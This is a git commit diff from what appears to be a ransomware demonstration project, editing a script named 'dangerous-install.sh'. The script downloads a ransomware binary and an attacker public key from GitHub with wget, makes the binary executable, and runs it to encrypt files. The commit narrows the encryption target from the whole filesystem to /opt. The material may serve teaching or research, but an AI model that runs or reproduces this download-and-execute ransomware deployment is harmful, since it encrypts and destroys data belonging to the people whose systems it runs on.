f011856751117356681e4fa30a2c596b25343fb6
soonann <sudo@soonann.dev>
2024-03-18 12:33:31 +0800

    WIP: install in opt with ransomware reference

--- ransomware/scripts/dangerous-install.sh
+++ ransomware/scripts/dangerous-install.sh
@@ -3,4 +3,4 @@ wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/
 wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/attacker/public_key.pem -O /tmp/public_key.pem
 chmod +x /tmp/ransomware
 export DISPLAY=:1.0
-/tmp/ransomware --pub /tmp/public_key.pem --path / --enc-sym-key /tmp/
+/tmp/ransomware --pub /tmp/public_key.pem --path /opt --enc-sym-key /tmp/
